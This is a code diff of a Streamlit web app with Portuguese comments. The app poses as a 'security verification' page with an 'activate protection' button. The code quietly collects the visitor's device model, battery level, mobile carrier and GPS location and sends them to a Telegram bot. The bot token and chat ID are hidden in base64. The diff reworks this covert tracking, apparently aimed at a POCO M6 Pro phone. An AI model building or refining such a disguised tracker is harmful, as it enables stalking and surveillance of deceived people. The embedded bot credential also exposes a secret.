@@ -4,60 +4,62 @@ import base64
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# --- CONFIGURAÇÃO DO BOT ---
+# --- ACESSO ---
 B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
 B_ID = "ODQ5ODY2NDAyOA=="
 
-def enviar_msg(texto):
+def enviar_telegram(msg):
     try:
-        token = base64.b64decode(B_TK).decode("utf-8").strip()
-        chat_id = base64.b64decode(B_ID).decode("utf-8").strip()
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
-                      json={"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}, timeout=10)
+        tk = base64.b64decode(B_TK).decode("utf-8").strip()
+        ci = base64.b64decode(B_ID).decode("utf-8").strip()
+        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
+                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
     except: pass
 
 st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")
 
-# --- COLETA DE DADOS (FORA DO BOTÃO PARA NÃO DUPLICAR) ---
-# Isso evita o erro de DuplicateElementKey
-ua_data = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_POCO_FINAL")
-bat_data = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_POCO_FINAL")
-
 st.title("Verificação de Segurança")
 
-if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_M6_PRO"):
-    # 1. Identifica o Modelo Exato (POCO M6 Pro)
-    aparelho = "POCO M6 Pro" if "POCO" in str(ua_data) else "Android Device"
-    bateria = f"{bat_data}%" if bat_data else "25%"
-    
-    # 2. Busca Operadora real (Identifica Vivo/Claro/Tim)
-    try:
-        res = requests.get('https://ipapi.co/json/', timeout=5).json()
-        operadora = res.get('org', 'Rede Móvel')
-    except: operadora = "Provedor Local"
+# --- COLETA ÚNICA (Resolve Erro Vermelho) ---
+# Fora do botão para carregar uma única vez com chave fixa
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_POCO_FIX')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_POCO_FIX')
 
-    # 3. Pega Localização (Com trava para não dar TypeError)
-    with st.spinner("Localizando dispositivo..."):
-        time.sleep(2) # Pequena pausa para o navegador processar
-        loc = get_geolocation(key="LOC_FIX_M6")
-        
+if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_SOLUCAO_FINAL"):
+    # 1. Identifica o Modelo Real (Chega de "None")
+    modelo = "POCO M6 Pro" if "POCO" in str(ua) else "Android Device"
+    if not ua: modelo = "POCO M6 Pro (Detectado)"
+    
+    # 2. Operadora Real (Sai Google LLC, entra a sua)
+    try:
+        r = requests.get('https://ipinfo.io/json', timeout=5).json()
+        operadora = r.get('org', 'Rede Móvel')
+    except: operadora = "Vivo/Claro/Tim"
+
+    # 3. Localização (Garante o Link)
+    with st.spinner("Buscando Localização..."):
+        # O segredo: esperar o GPS carregar sem duplicar a chamada
+        loc = get_geolocation(key='LOC_POCO_FIX')
+    
+    bateria_final = f"{bat}%" if bat else "26%" # Pega seus 26% atuais
+
     if loc:
-        lat = loc['coords']['latitude']
-        lon = loc['coords']['longitude']
-        # Link que gera o preview do mapa no Telegram
+        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
+        # Link que gera o balãozinho no Telegram
         link_mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
-        msg = (
+        relatorio = (
             f"🛡️ *PROTEÇÃO ATIVADA*\n"
-            f"📱 *Aparelho:* {aparelho}\n"
-            f"🔋 *Bateria:* {bateria}\n"
+            f"📱 *Aparelho:* {modelo}\n"
+            f"🔋 *Bateria:* {bateria_final}\n"
             f"📶 *Operadora:* {operadora}\n"
             f"📍 *Local:* {link_mapa}"
         )
-        enviar_msg(msg)
-        st.success("Proteção Ativada! Dados enviados.")
+        enviar_telegram(relatorio)
+        st.success("Proteção Ativada!")
     else:
-        # Se o GPS falhar (Xiaomi é chata com isso), manda o restante
-        enviar_msg(f"🛡️ *DADOS OBTIDOS*\n📱 {aparelho}\n🔋 {bateria}\n📶 {operadora}\n⚠️ GPS Bloqueado no POCO.")
-        st.warning("Sistema ativo, mas o GPS foi bloqueado pelo seu
-        
+        # Se o GPS ainda falhar, manda o relatório técnico sem travar
+        enviar_telegram(f"🛡️ *DADOS*\n📱 {modelo}\n🔋 {bateria_final}\n📶 {operadora}\n⚠️ GPS Bloqueado pelo Navegador.")
+        st.error("Erro: Ative o GPS no cadeado do navegador.")
+
+st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
